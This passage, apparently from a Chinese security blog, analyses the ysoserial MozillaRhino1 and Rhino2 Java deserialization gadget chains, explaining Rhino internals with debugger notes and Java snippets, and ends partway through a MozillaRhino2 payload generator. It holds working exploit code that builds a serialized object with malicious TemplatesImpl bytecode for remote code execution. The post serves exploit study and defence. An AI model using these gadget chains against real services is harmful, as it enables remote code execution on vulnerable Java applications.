<p>随后会进入上述的一串while循环，第一次是过掉了2个if进入了getPrototype()，o为NativeError类，这个方法会获取其prototypeObject属性<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1682943733397-a46d1d1a-5657-4a75-9920-ea3ce13b1818.png#averageHue=%232e2e2b&clientId=u783c079d-4ee6-4&from=paste&height=130&id=u9b1e2435&originHeight=162&originWidth=1100&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=251019&status=done&style=none&taskId=u7f3f69c4-ab31-4400-9a49-6ebb301ad22&title=&width=880" alt="image.png"><br>可以看到我们获取到了一个NativeJavaObject实例<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1682943756003-2a10627c-bf27-45f2-9496-709c3b6d1322.png#averageHue=%23272927&clientId=u783c079d-4ee6-4&from=paste&height=215&id=u67ca0149&originHeight=269&originWidth=947&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=355284&status=done&style=none&taskId=u551b5b54-d643-4b43-b301-2c9ddeb2f82&title=&width=757.6" alt="image.png"><br>其中的javaObject就是恶意templates<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1682943772830-6e6fc2b4-64a6-4d6c-a64e-c05873f97cf2.png#averageHue=%232c2f2a&clientId=u783c079d-4ee6-4&from=paste&height=66&id=u8e279e49&originHeight=83&originWidth=1257&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=152075&status=done&style=none&taskId=u629b823d-e836-4e65-92c7-d8af5afba81&title=&width=1005.6" alt="image.png"><br>调用NativeJavaObject的uwrap函数，跟进看看<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1682943788105-e64b166f-ab32-4b3d-aff2-eaed10ba3d03.png#averageHue=%2331332f&clientId=u783c079d-4ee6-4&from=paste&height=110&id=u8fe1119d&originHeight=137&originWidth=1028&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=207725&status=done&style=none&taskId=u3bbebd81-7ae9-4374-b630-29ee912a63c&title=&width=822.4" alt="image.png"><br>返回JavaObject也就是Templates，随之invoke 完成 rce<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1682943807606-55cf0ff1-a63a-4a9b-8ae4-f69579b56e66.png#averageHue=%232f2f2a&clientId=u783c079d-4ee6-4&from=paste&height=506&id=uf9ec5291&originHeight=632&originWidth=1530&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1095892&status=done&style=none&taskId=u245e9bbc-ecc0-4b8d-80f4-0903608ffd0&title=&width=1224" alt="image.png"></p>
<h2 id="小细节"><a href="#小细节" class="headerlink" title="小细节"></a>小细节</h2><p>POC中有这么一段</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将 GetterSlot 放入到 NativeError 的 slots 中</span></span><br><span class="line">       <span class="type">Method</span> <span class="variable">getSlot</span> <span class="operator">=</span> ScriptableObject.class.getDeclaredMethod(<span class="string">&quot;getSlot&quot;</span>, String.class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">       getSlot.setAccessible(<span class="literal">true</span>);</span><br><span class="line">       <span class="type">Object</span> <span class="variable">slotObject</span> <span class="operator">=</span> getSlot.invoke(nativeError, <span class="string">&quot;name&quot;</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 反射将 NativeJavaMethod 实例放到 GetterSlot 的 getter 里</span></span><br><span class="line">       <span class="comment">// ysoserial 调用了 setGetterOrSetter 方法，我这里直接反射写进去，道理都一样</span></span><br><span class="line">       Class&lt;?&gt; getterSlotClass = Class.forName(<span class="string">&quot;org.mozilla.javascript.ScriptableObject$GetterSlot&quot;</span>);</span><br><span class="line">       <span class="type">Field</span>    <span class="variable">getterField</span>     <span class="operator">=</span> getterSlotClass.getDeclaredField(<span class="string">&quot;getter&quot;</span>);</span><br><span class="line">       getterField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">       getterField.set(slotObject, nativeJavaMethod);</span><br></pre></td></tr></table></figure>
<p>这一段第一次看起来可能比较的迷惑。首先第一段反射调用getSlot方法获取到一个Slot对象，然后GetterSlot是Slot的子类<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1682944046582-ba21fef1-7ace-4173-b2af-3a518dfc2b15.png#averageHue=%232e2e29&clientId=u783c079d-4ee6-4&from=paste&height=163&id=u9fdcf1d2&originHeight=204&originWidth=867&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=259923&status=done&style=none&taskId=u067357e2-24bb-4d0c-83cd-e2c60572f32&title=&width=693.6" alt="image.png"><br>因此我们设置Slot的getter方法对应调试流程中的这一步<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1682943117685-a647a414-5b60-41be-ac48-3f59fa9f5f06.png#averageHue=%232e312e&clientId=u783c079d-4ee6-4&from=paste&height=845&id=Dl9FK&originHeight=1056&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2712654&status=done&style=none&taskId=ub318310f-4342-486a-8918-46feacaba9d&title=&width=1536" alt="image.png"><br>强转Slot为GetterSlot获取getter属性</p>
<h1 id="Rhino2链"><a href="#Rhino2链" class="headerlink" title="Rhino2链"></a>Rhino2链</h1><p>我直接复制粘贴了，实在是比较的长。<br>参考：<a target="_blank" rel="noopener" href="https://su18.org/post/ysoserial-su18-4/#nativejavaarray-environment">https://su18.org/post/ysoserial-su18-4/#nativejavaarray-environment</a></p>
<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="JavaMembers"><a href="#JavaMembers" class="headerlink" title="JavaMembers"></a>JavaMembers</h3><p>org.mozilla.javascript.JavaMembers 是 Rhino 对 Java Class的一种封装和描述。<br>JavaMembers 实例化时接收一个 Scriptable 对象，一个 Class 类型的对象，和一个布尔类型的参数 includeProtected 表示是否包含 “Protect” 修饰符的，调用 reflect() 方法获取类的信息并放入自己的相关成员变量中。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1682946140668-ecf332d3-4bc6-4b4e-9444-d31ba3c5484e.png#averageHue=%23262625&clientId=u783c079d-4ee6-4&from=paste&id=ua200a73f&originHeight=1012&originWidth=1322&originalType=url&ratio=1.25&rotation=0&showTitle=false&size=219797&status=done&style=none&taskId=uf158eb8e-278a-41ae-89b1-1a7c17e5636&title=" alt="image.png"><br>其中包括：</p>
<ul>
<li>调用 discoverAccessibleMethods() 方法获取类中的全部 Method，如果是静态方法，则将方法名和 Method 对象映射的 Map 放入 staticMembers 中，否则放入 members 中。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1682946140839-eb402a7c-d057-4ce4-9ac8-70634594c275.png#averageHue=%23272626&clientId=u783c079d-4ee6-4&from=paste&id=u6a68b67b&originHeight=1104&originWidth=1376&originalType=url&ratio=1.25&rotation=0&showTitle=false&size=257426&status=done&style=none&taskId=u2238e978-3f8c-4f53-bf9d-a765da6ee96&title=" alt="image.png"></li>
<li>然后把 staticMembers 和 members 中的 Method 实例用 NativeJavaMethod 作为 Wrapper 进行封装，这样 staticMembers 和 members 中就变成了方法名和 NativeJavaMethod 实例的映射。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1682946141148-1d0ba5eb-9271-4a2c-86c7-3c96841c8a08.png#averageHue=%23272626&clientId=u783c079d-4ee6-4&from=paste&id=ud4715ff3&originHeight=1172&originWidth=1310&originalType=url&ratio=1.25&rotation=0&showTitle=false&size=274375&status=done&style=none&taskId=ue54fd9fc-a791-46fb-ac24-37d2debf06b&title=" alt="image.png"></li>
<li>接下来对 Field 进行映射，依旧是区分是否静态并存放在 staticMembers 和 members 中，如果 field 名和 method 名重复，则使用 FieldAndMethods 对象来同时封装二者。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1682946140931-04b69de4-bd70-4d0c-8d7d-ecc7a3ebc8af.png#averageHue=%23252424&clientId=u783c079d-4ee6-4&from=paste&id=u9e9fa941&originHeight=730&originWidth=1370&originalType=url&ratio=1.25&rotation=0&showTitle=false&size=172238&status=done&style=none&taskId=u3d066dbe-3961-4431-b626-f52b784422e&title=" alt="image.png"></li>
<li>接下来是对 get&#x2F;set 方法进行提取和封装，对所有 get&#x2F;set&#x2F;is 开头 的方法名进行提取，去除前缀并将第一位字母改为小写，作为 beanPropertyName，然后获取在 staticMembers 和 members 中查找属性对应的 get&#x2F;set&#x2F;is 方法的映射，如果有 NativeJavaMethod 的值，在其中找到无参且有返回值的方法。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1682946141319-b628a9eb-74a8-4474-927c-6ff313ceb835.png#averageHue=%23262625&clientId=u783c079d-4ee6-4&from=paste&id=u945db391&originHeight=718&originWidth=1216&originalType=url&ratio=1.25&rotation=0&showTitle=false&size=183475&status=done&style=none&taskId=u07d3b192-af60-4bc4-8b65-7891fce9264&title=" alt="image.png"></li>
<li>使用获得的 getter&#x2F;setter 实例化 BeanProperty ，并用 beanPropertyName 和映射存放在 staticMembers 和 members 中。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1682946141982-d30568ed-2960-4c9c-94d4-98bb2aa75f3b.png#averageHue=%23242424&clientId=u783c079d-4ee6-4&from=paste&id=uff3768c8&originHeight=642&originWidth=1290&originalType=url&ratio=1.25&rotation=0&showTitle=false&size=94543&status=done&style=none&taskId=u57728163-62b9-477c-bb86-1330b4a49a1&title=" alt="image.png"></li>
<li>最后映射构造方法，使用 MemberBox 包裹后存入 ctors。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1682946142162-a5dec95c-6596-470e-9869-b5be24003d87.png#averageHue=%231f1f1f&clientId=u783c079d-4ee6-4&from=paste&id=u8c6d842d&originHeight=330&originWidth=1066&originalType=url&ratio=1.25&rotation=0&showTitle=false&size=70392&status=done&style=none&taskId=ue3ee7055-d0d6-496f-b2a6-45ba8e657dc&title=" alt="image.png"></li>
</ul>
<p>经过了 JavaMembers 的初始化后，可以说一个 Java Class 的相关信息被储存和封装在了这个 JavaMembers 中。JavaMembers 提供了很多方法来查询和提取相应的对象以供调用。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1682946144981-60fc600a-7806-4c55-942a-4fd310d4926f.png#averageHue=%233f4348&clientId=u783c079d-4ee6-4&from=paste&id=u101dd247&originHeight=1520&originWidth=1404&originalType=url&ratio=1.25&rotation=0&showTitle=false&size=451414&status=done&style=none&taskId=u76d58ebd-27dc-423a-b0a4-e5859980946&title=" alt="image.png"><br>其中有一个 static 方法 lookupClass()，为 JavaMembers 对象提供了缓存功能，如果有，则从ClassCache 中提取，如果没有，则 new 一个 JavaMembers 并放在响应的缓存中。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1682946144235-72f03377-772e-4513-8c74-1b4ef915e456.png#averageHue=%23262525&clientId=u783c079d-4ee6-4&from=paste&id=u123c9e92&originHeight=820&originWidth=1558&originalType=url&ratio=1.25&rotation=0&showTitle=false&size=187279&status=done&style=none&taskId=u059ec3c2-f309-4269-90f6-9b0d6d53cc2&title=" alt="image.png"><br>JavaMembers 还提供了一个 get() 方法，是本条链最重要的触发点，简单来说，这个方法接收一个属性名，和一个类实例，然后使用反射去调用这个属性的 getter 方法，然后根据返回值的类型不同，使用自己的类去 Wrap 这个返回值，如 Array 用 NativeJavaArray， Object 的用 NativeJavaObject。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1682946145199-6c084424-8512-4d87-9f81-bf410c701224.png#averageHue=%232a2726&clientId=u783c079d-4ee6-4&from=paste&id=u748e91e2&originHeight=1602&originWidth=1346&originalType=url&ratio=1.25&rotation=0&showTitle=false&size=363849&status=done&style=none&taskId=u07a9505f-ebb4-4129-8ac1-a76097529cc&title=" alt="image.png"><br>那既然如此，就可以使用这个方法来触发 TemplatesImpl 的 getOutputProperties 方法。测试代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">tmpl</span> <span class="operator">=</span> SerializeUtil.generateTemplatesImpl();</span><br><span class="line"></span><br><span class="line"><span class="type">Context</span>      <span class="variable">context</span>          <span class="operator">=</span> Context.enter();</span><br><span class="line"><span class="type">NativeObject</span> <span class="variable">scriptableObject</span> <span class="operator">=</span> (NativeObject) context.initStandardObjects();</span><br><span class="line"></span><br><span class="line">Class&lt;?&gt; c = Class.forName(<span class="string">&quot;org.mozilla.javascript.JavaMembers&quot;</span>);</span><br><span class="line"><span class="type">Method</span>   <span class="variable">m</span> <span class="operator">=</span> c.getDeclaredMethod(<span class="string">&quot;lookupClass&quot;</span>, Scriptable.class, Class.class, Class.class, <span class="type">boolean</span>.class);</span><br><span class="line">m.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> m.invoke(<span class="literal">null</span>, scriptableObject, TemplatesImpl.class, TemplatesImpl.class, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Method</span> <span class="variable">m2</span> <span class="operator">=</span> c.getDeclaredMethod(<span class="string">&quot;get&quot;</span>, Scriptable.class, String.class, Object.class, <span class="type">boolean</span>.class);</span><br><span class="line">m2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">m2.invoke(o, scriptableObject, <span class="string">&quot;outputProperties&quot;</span>, tmpl, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
<h3 id="NativeJavaObject"><a href="#NativeJavaObject" class="headerlink" title="NativeJavaObject"></a>NativeJavaObject</h3><p>在 MozillaRhino1 中，使用了 NativeJavaObject 作为 Wrapper 类来返回恶意的 javaObject，也就是 TemplatesImpl，当时仅仅是关注了 NativeJavaObject 同时实现了 Wrapper 和 Scriptable 这两个接口，这里来详细看一下。<br>NativeJavaObject 是一个对非 Array 类型的 Java Object 的封装，构造方法接收 javaObject 对象，staticType Class对象，调用 initMembers() 方法来封装和获取相关信息。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1682946144680-78cbadbc-c5d2-461c-952d-37d440832d2b.png#averageHue=%23252424&clientId=u783c079d-4ee6-4&from=paste&id=u3cc7d6f1&originHeight=676&originWidth=1208&originalType=url&ratio=1.25&rotation=0&showTitle=false&size=134179&status=done&style=none&taskId=ucc83dcda-6049-4685-ae0a-e7fc2883230&title=" alt="image.png"><br>initMembers() 方法调用了 JavaMembers.lookupClass() 来执行之前描述过的解析过程，而将生成的结果存在成员变量 member 中。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1682946144790-e6313f5e-b245-44be-8949-864ee914f1fa.png#averageHue=%23232322&clientId=u783c079d-4ee6-4&from=paste&id=u4463c33d&originHeight=538&originWidth=1244&originalType=url&ratio=1.25&rotation=0&showTitle=false&size=119026&status=done&style=none&taskId=u22902dad-9aa4-4291-95fb-86abd522096&title=" alt="image.png"><br>而 NativeJavaObject 的 get 方法则调用了 JavaMembers 的 get 方法。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1682946145826-a7da153a-8c79-4e14-bff9-d9b5d7f3c448.png#averageHue=%23242323&clientId=u783c079d-4ee6-4&from=paste&id=u077907ee&originHeight=516&originWidth=1196&originalType=url&ratio=1.25&rotation=0&showTitle=false&size=97010&status=done&style=none&taskId=u8730269d-9049-445c-837c-e5df0a3aceb&title=" alt="image.png"><br>那其实就可以通过 NativeJavaObject 的 get 方法来直接出发恶意调用，测试代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span>    <span class="variable">tmpl</span>             <span class="operator">=</span> SerializeUtil.generateTemplatesImpl();</span><br><span class="line"><span class="type">Context</span>          <span class="variable">context</span>          <span class="operator">=</span> Context.enter();</span><br><span class="line"><span class="type">NativeObject</span>     <span class="variable">scriptableObject</span> <span class="operator">=</span> (NativeObject) context.initStandardObjects();</span><br><span class="line"><span class="type">NativeJavaObject</span> <span class="variable">nativeJavaObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NativeJavaObject</span>(scriptableObject, tmpl, TemplatesImpl.class);</span><br><span class="line">nativeJavaObject.get(<span class="string">&quot;outputProperties&quot;</span>, scriptableObject);</span><br></pre></td></tr></table></figure>
<p>除此之外，NativeJavaObject 实现了 Serializable 接口，重写了 readObject 方法，在反序列化过程中，会判断 isAdapter 标志位，如果为 true，则会调用反射调用 adapter_readAdapterObject 传入 this 对象和 ObjectInputStream。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1682946146279-916c88dc-3ae2-4828-b898-8d9aeef79770.png#averageHue=%23272626&clientId=u783c079d-4ee6-4&from=paste&id=u4e772b48&originHeight=1198&originWidth=1366&originalType=url&ratio=1.25&rotation=0&showTitle=false&size=223219&status=done&style=none&taskId=u94bd37f4-4577-44e9-a3c6-47afdda7265&title=" alt="image.png"><br>而这个 adapter_readAdapterObject 实际上是 org.mozilla.javascript.JavaAdapter 的 readAdapterObject 方法，在 NativeJavaObject 的 static 语句进行了初始化。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1682946146400-1b2d0e30-a646-4c7a-8835-6539df673415.png#averageHue=%23252525&clientId=u783c079d-4ee6-4&from=paste&id=u2ebbedbc&originHeight=940&originWidth=1354&originalType=url&ratio=1.25&rotation=0&showTitle=false&size=211380&status=done&style=none&taskId=uc0030486-083c-4e7f-8828-9f62edad276&title=" alt="image.png"><br>也就是说，在 isAdapter 为 false 时，NativeJavaObject 使用自己的逻辑反序列化，而 isAdapter 为 true 时，NativeJavaObject 委托 JavaAdapter 为其反序列化。跟一下调用逻辑：<br>readAdapterObject 从 ObjectInputStream 中读取数据，调用 getAdapterClass() 获取 Adapter 对象的 Class，并通过反射调用指定参数的构造方法进行实例化， getAdapterClass() 方法接收的第四个参数 delegee 其实就是 NativeJavaObject 中的 javaObject。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1682946146839-91e15561-3329-4b4a-b918-c3125b6129a8.png#averageHue=%23282626&clientId=u783c079d-4ee6-4&from=paste&id=u5876794d&originHeight=1278&originWidth=1268&originalType=url&ratio=1.25&rotation=0&showTitle=false&size=275368&status=done&style=none&taskId=u56bd6fdf-332b-4c5c-b76f-d9cdd9f68af&title=" alt="image.png"><br>getAdapterClass() 方法调用了 getObjectFunctionNames 方法返回 ObjToIntMap 对象。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1682946147109-316d3044-7299-4783-84ad-c73dd28e7a7e.png#averageHue=%23262323&clientId=u783c079d-4ee6-4&from=paste&id=u3e5a77f7&originHeight=604&originWidth=1390&originalType=url&ratio=1.25&rotation=0&showTitle=false&size=163569&status=done&style=none&taskId=u5a479a52-6108-4ea6-ba84-f9007317eb9&title=" alt="image.png"><br>而 getObjectFunctionNames 方法调用了 ScriptableObject.getProperty() 方法，会触发对象的 get 方法。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1682946147271-5b3e00e9-84cb-4f1a-9246-0e9d34fe6733.png#averageHue=%23262525&clientId=u783c079d-4ee6-4&from=paste&id=u32415d01&originHeight=912&originWidth=1318&originalType=url&ratio=1.25&rotation=0&showTitle=false&size=190226&status=done&style=none&taskId=u8881ec12-26d6-4ba7-bcbc-7cbd2973792&title=" alt="image.png"><br>此时，如果 obj 是带有恶意 javaObjet 的 NativeJavaObject，而 id 是 “outputProperties”，岂不是就触发漏洞了吗？<br>想的很美，但是 id 并非传参，而是使用了 ScriptableObject.getPropertyIds(obj) 返回的字符串类型数组循环得到的。<br>ScriptableObject.getPropertyIds() 方法实际调用 obj 的 getIds()，而如果 obj 是 NativeJavaObject ，将会调用 JavaMembers 的 getIds 方法。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1682946147749-bb7baf91-4bab-471c-ad45-f876ef995c3e.png#averageHue=%231c1b1a&clientId=u783c079d-4ee6-4&from=paste&id=u815ce392&originHeight=228&originWidth=838&originalType=url&ratio=1.25&rotation=0&showTitle=false&size=29776&status=done&style=none&taskId=u8c7ba316-9df9-4639-980f-d829613def3&title=" alt="image.png"><br>方法会返回所有非静态 member 储存 Map 的 key，实际上 JavaMembers 对象初始化时储存的全部成员变量和方法的 name 。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1682946148069-a0a866c1-01d0-4e67-bbfb-f04f520edb42.png#averageHue=%231f1f1e&clientId=u783c079d-4ee6-4&from=paste&id=ubdb32963&originHeight=310&originWidth=1218&originalType=url&ratio=1.25&rotation=0&showTitle=false&size=58958&status=done&style=none&taskId=u96f4708e-730d-404b-8d9c-240dee9fb7b&title=" alt="image.png"><br>这种情况下，如果 obj 为 NativeJavaObject ，ids 中确实可以包含 outputProperties，但是由于后续会触发 invoke 方法调用，for 循环还没执行到那一步就会报错。所以还是没办法触发调用。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1682946148947-fd4858e1-9650-42ef-9478-b782294508b6.png#averageHue=%23566c4c&clientId=u783c079d-4ee6-4&from=paste&id=uf8d6b565&originHeight=1474&originWidth=1852&originalType=url&ratio=1.25&rotation=0&showTitle=false&size=352205&status=done&style=none&taskId=ubb19ae08-1638-4640-aae9-6c2ea349297&title=" alt="image.png"><br>于是我们需要想办法让 ScriptableObject.getPropertyIds() 这个方法只返回一个值。</p>
<h3 id="NativeJavaArray-Environment"><a href="#NativeJavaArray-Environment" class="headerlink" title="NativeJavaArray + Environment"></a>NativeJavaArray + Environment</h3><p>NativeJavaArray 是 NativeJavaObject 的子类，满足 NativeJavaObject 的一切特征。<br>同时其 getIds() 方法返回空。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1682946148792-356c69b0-6358-4c9d-93e1-5e581d31c852.png#averageHue=%23212120&clientId=u783c079d-4ee6-4&from=paste&id=ue030e2e3&originHeight=420&originWidth=880&originalType=url&ratio=1.25&rotation=0&showTitle=false&size=58272&status=done&style=none&taskId=u4885ae05-c9b1-4827-a9f1-774ce162410&title=" alt="image.png"><br>ScriptableObject.getPropertyIds() 这个方法会调用 obj 的 getIds()，还会调用其原型 prototype 的 getIds()。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1682946149045-33ceaa91-ab72-4165-8a75-6e2033ce7944.png#averageHue=%23282726&clientId=u783c079d-4ee6-4&from=paste&id=u0743c9ab&originHeight=1460&originWidth=1332&originalType=url&ratio=1.25&rotation=0&showTitle=false&size=236415&status=done&style=none&taskId=u08d549a4-58f5-4647-a9fb-85342a78718&title=" alt="image.png"><br>ysoserial 使用了 org.mozilla.javascript.tools.shell.Environment 作为 NativeJavaArray 的原型触发，Environment 的 getIds() 方法调用 super 也就是 ScriptableObject.getIds()<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1682946148944-89d2db31-4adc-4016-8e00-075a225d5694.png#averageHue=%231e1d1d&clientId=u783c079d-4ee6-4&from=paste&id=u7a2c431d&originHeight=252&originWidth=1482&originalType=url&ratio=1.25&rotation=0&showTitle=false&size=45490&status=done&style=none&taskId=u2d6ee2ed-16f7-4681-8239-a43c94a9a75&title=" alt="image.png"><br>方法从 firstAdded 成员变量中获取 Slot name 并返回。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1682946149674-06a33196-abd4-416e-9416-936997b0f230.png#averageHue=%23292726&clientId=u783c079d-4ee6-4&from=paste&id=u236ae4b8&originHeight=1398&originWidth=1570&originalType=url&ratio=1.25&rotation=0&showTitle=false&size=323967&status=done&style=none&taskId=u653d5139-f250-4b00-8d9f-b3c86403476&title=" alt="image.png"><br>这样我们就可以构造出利用链了。</p>
<h2 id="攻击构造"><a href="#攻击构造" class="headerlink" title="攻击构造"></a>攻击构造</h2><p>这条链我仅仅是看通了调用，对于 Rhino 本身的代码并不了解，所以很难说完全理解了利用链，这里直接使用 ysoserial 的代码来进行攻击构造，先列出几个点：</p>
<ul>
<li>ysoserial 使用反射调用 ScriptableObject 的 accessSlot 方法来注册 Slot，直接反射写入firstAdded 应该也可</li>
<li>为了触发构造，需要使 NativeJavaObject 的 isAdapter 为 true，但是这样在序列化时就会报错，为了避免此情况，需要对其 adapter_writeAdapterObject 成员变量进行篡改。</li>
</ul>
<p>最终代码为：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MozillaRhino2</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> <span class="string">&quot;MozillaRhino2.bin&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">customWriteAdapterObject</span><span class="params">(Object javaObject, ObjectOutputStream out)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">		out.writeObject(<span class="string">&quot;java.lang.Object&quot;</span>);</span><br><span class="line">		out.writeObject(<span class="keyword">new</span> <span class="title class_">String</span>[<span class="number">0</span>]);</span><br><span class="line">		out.writeObject(javaObject);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 生成包含恶意类字节码的 TemplatesImpl 类</span></span><br><span class="line">		<span class="type">TemplatesImpl</span> <span class="variable">tmpl</span> <span class="operator">=</span> SerializeUtil.generateTemplatesImpl();</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 初始化一个 Environment 对象作为 scope</span></span><br><span class="line">		<span class="type">ScriptableObject</span> <span class="variable">scope</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Environment</span>();</span><br><span class="line">		<span class="comment">// 创建 associatedValues</span></span><br><span class="line">		Map&lt;Object, Object&gt; associatedValues = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;();</span><br><span class="line">		<span class="comment">// 创建一个 ClassCache 实例</span></span><br><span class="line">		<span class="type">Object</span> <span class="variable">classCacheObject</span> <span class="operator">=</span> SerializeUtil.createInstanceUnsafely(ClassCache.class);</span><br><span class="line">		associatedValues.put(<span class="string">&quot;ClassCache&quot;</span>, classCacheObject);</span><br><span class="line"></span><br><span class="line">		<span class="type">Field</span> <span class="variable">associateField</span> <span class="operator">=</span> ScriptableObject.class.getDeclaredField(<span class="string">&quot;associatedValues&quot;</span>);</span><br><span class="line">		associateField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">		associateField.set(scope, 